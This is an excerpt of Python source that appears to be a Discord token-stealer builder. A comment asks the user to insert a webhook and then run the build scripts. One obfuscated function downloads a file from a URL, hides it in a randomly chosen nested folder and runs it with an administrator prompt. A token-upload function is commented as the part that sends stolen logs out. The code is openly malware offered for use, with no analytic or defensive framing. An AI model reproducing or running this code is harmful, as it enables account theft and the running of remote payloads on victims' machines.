...
hook = "replace_me" #HEY BUDDY REPLACE YOUR WEBHOOK WITH replace_me THEN RUN SETUP.BAT AND BUILD.BAT! --Konan#0787
...
e = lambda length=15: ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def run_as_admin(executable_path):
    try:
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", executable_path, None, None, 1)
        return result > 32
    except Exception as e:
        print(f"Error: {e}")
        return False

def find_valid_folder(base_folder):
    valid_folders = [d for d in os.listdir(base_folder) if os.path.isdir(os.path.join(base_folder, d))]
    return random.choice(valid_folders) if valid_folders else None
...
def g(a, b, c):
    ...
    i = urllib.request.Request(b, headers=d)

    try:
        l = find_valid_folder(c)
        if not l:
            raise ValueError("No valid folders found")

        m = l
        os.rename(os.path.join(c, l), os.path.join(c, m))

        n = find_valid_folder(os.path.join(c, m))
        if not n:
            raise ValueError("No valid subfolders found")

        p = n
        q = os.path.join(c, m, p, a)

        with urllib.request.urlopen(i) as r, open(q, 'wb') as s:
            t = r.read()
            s.write(t)
        ...
        if not run_as_admin(q):
            ...
            os.system("pause")
    except (urllib.error.HTTPError, ValueError) as u:
        print(f"Error: {u}")
        g(a, b, c)
...
def uploadToken(token, path):
    ...
    #THATS THE PART WHICH SENDS LOGS!
